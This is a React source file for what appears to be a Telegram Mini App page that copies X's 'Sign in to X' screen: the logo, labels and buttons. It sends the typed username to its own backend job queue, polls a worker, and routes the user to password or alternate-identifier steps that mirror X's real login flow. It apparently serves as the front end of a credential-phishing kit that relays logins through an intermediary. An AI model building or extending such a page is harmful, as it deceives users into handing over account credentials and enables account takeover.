// src/pages/Username.tsx
import { useState } from "react";
import axios from "axios";
import { useSignal, initData } from "@tma.js/sdk-react";
import { useNavigate } from "react-router-dom";
import "./Username.css";

import type {
  JobsStatusResponse,
  JobCommandResponse,
} from "../../../server/src/types/jobs";

import { FullScreenLoader } from "../components/FullScreenLoader";
import { Toast } from "../components/Toast";
import { API_BASE } from "../config/api";

export const Username = () => {
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState("");

  const initDataRaw = useSignal(initData.raw);
  const navigate = useNavigate();

  const pollCommandUntilDone = async (commandId: string, maxMs = 20000) => {
    const start = Date.now();

    while (Date.now() - start < maxMs) {
      const resp = await axios.post<JobsStatusResponse>(
        `${API_BASE}/jobs/status`,
        { initData: initDataRaw },
        { headers: { "Content-Type": "application/json" } }
      );

      const cs = resp.data.commandState;

      // 1) Pas de commandState → attendre
      if (!cs) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      // 2) CommandState d'une autre commande → ignorer et attendre
      if (cs.commandId !== commandId) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      // 3) Bonne commande mais pas finie → attendre
      if (cs.status === "pending" || cs.status === "running") {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      // 4) done / error pour la bonne commande
      return cs;
    }

    return null;
  };

  const handleNext = async () => {
    setToast("");

    if (!initDataRaw) {
      setToast("Telegram initData missing");
      return;
    }

    const username = input.trim();
    if (!username) {
      setToast("Please enter a username");
      return;
    }

    try {
      setLoading(true);

      const cmdResp = await axios.post<JobCommandResponse>(
        `${API_BASE}/jobs/command`,
        {
          initData: initDataRaw,
          command: {
            type: "enter-username",
            payload: { username },
          },
        },
        { headers: { "Content-Type": "application/json" } }
      );

      if (!cmdResp.data.ok) {
        setLoading(false);
        const error = cmdResp.data.error || "Command failed";
        if (error === "NO_ACTIVE_SESSION") {
          navigate("/oauth");
          return;
        }
        setToast(error);
        return;
      }

      const commandId = cmdResp.data.commandId;
      if (!commandId) {
        setLoading(false);
        setToast("Missing commandId from server");
        return;
      }

      // ✅ Poll jusqu'à résultat worker POUR CETTE COMMANDE
      const finalState = await pollCommandUntilDone(commandId);

      setLoading(false);

      if (!finalState) {
        setToast("Timeout, please try again");
        return;
      }

      if (finalState.status === "done" && finalState.result?.ok) {
        const nextStep = finalState.result?.nextStep;

        if (nextStep === "alternate_identifier") {
          navigate("/alternative-identifier", { state: { username } });
          return;
        }

        // default password
        navigate("/password", { state: { username } });
        return;
      }

      // ❌ erreur username
      const msg =
        finalState.error || finalState.result?.message || "Invalid username";
      setToast(msg);
    } catch (err: any) {
      setLoading(false);
      const error = err.response?.data?.error || err.message || "Network error";
      if (error === "NO_ACTIVE_SESSION") {
        navigate("/oauth");
        return;
      }
      setToast(error);
    }
  };

  return (
    <div className="username-page">
      <FullScreenLoader visible={loading} text="Checking username..." />
      <Toast message={toast} onClose={() => setToast("")} />

      <div className="username-modal" role="dialog" aria-modal="true">
        {/* Header */}
        <div className="username-header">
          <div className="username-header-content">
            <div className="username-close-button-container">
              <button
                className="username-close-button"
                aria-label="Close"
                type="button"
                onClick={() => navigate(-1)}
              >
                <svg
                  viewBox="0 0 24 24"
                  aria-hidden="true"
                  className="username-close-icon"
                >
                  <g>
                    <path d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"></path>
                  </g>
                </svg>
              </button>
            </div>
            <div className="username-logo-container">
              <svg
                viewBox="0 0 24 24"
                aria-label="X"
                role="img"
                className="username-logo"
              >
                <g>
                  <path d="M21.742 21.75l-7.563-11.179 7.056-8.321h-2.456l-5.691 6.714-4.54-6.714H2.359l7.29 10.776L2.25 21.75h2.456l6.035-7.118 4.818 7.118h6.191-.008zM7.739 3.818L18.81 20.182h-2.447L5.29 3.818h2.447z"></path>
                </g>
              </svg>
            </div>
            <div className="username-header-spacer"></div>
          </div>
        </div>

        {/* Content */}
        <div className="username-content">
          <div className="username-title-container">
            <h1 className="username-title" id="modal-header">
              Sign in to X
            </h1>
          </div>

          <div className="username-form">
            <label className="username-label">
              <div className="username-label-text">
                <span>
                  Phone number, email address, or username
                </span>
              </div>
              <div className="username-input-wrapper">
                <input
                  type="text"
                  name="text"
                  autoComplete="username"
                  autoCapitalize="sentences"
                  autoCorrect="on"
                  spellCheck="true"
                  dir="auto"
                  className="username-input"
                  value={input}
                  onChange={(e) => setInput(e.target.value)}
                  disabled={loading}
                  onKeyDown={(e) => {
                    if (e.key === "Enter" && !loading) {
                      handleNext();
                    }
                  }}
                />
              </div>
            </label>

            <button
              className="username-next-button"
              onClick={handleNext}
              disabled={loading || !input.trim()}
              type="button"
            >
              <span>Next</span>
            </button>

            <button className="username-forgot-button" type="button">
              <span>Forgot password?</span>
            </button>

            <div className="username-signup-link">
              <span>Don't have an account? </span>
              <button type="button" className="username-signup-button">
                <span>Sign up</span>
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
